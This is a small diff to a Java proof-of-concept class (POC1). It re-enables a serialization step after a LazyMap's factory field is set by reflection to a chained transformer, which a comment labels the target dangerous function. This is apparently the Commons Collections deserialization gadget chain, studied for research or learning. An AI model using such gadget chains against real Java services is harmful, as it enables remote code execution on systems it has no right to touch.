@@ -49,7 +49,7 @@ public class POC1 {
         factoryField.setAccessible(true);//私有属性
         factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数
 
-//        Serialization(map2);
+        Serialization(map2);
         Unserialization();
     }
 }
